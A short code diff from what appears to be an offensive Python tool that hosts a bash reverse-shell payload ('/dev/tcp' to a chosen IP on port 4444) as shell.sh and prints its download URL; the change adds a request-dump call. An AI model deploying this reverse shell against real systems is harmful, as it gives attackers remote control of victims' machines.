@@ -278,6 +278,7 @@ if __name__ == "__main__":
         listenPort = 4444 if len(sys.argv) < 3 else int(sys.argv[2])
         rev_shell = "bash -i >& /dev/tcp/%s/%d 0>&1" % (ipAddress, listenPort)
         fileServer.addFile("shell.sh", rev_shell)
+        fileServer.dumpRequest("/")
         print("Reverse Shell URL: http://%s/shell.sh" % ipAddress)
     elif sys.argv[1] == "dump":
         fileServer.dumpRequest("/")
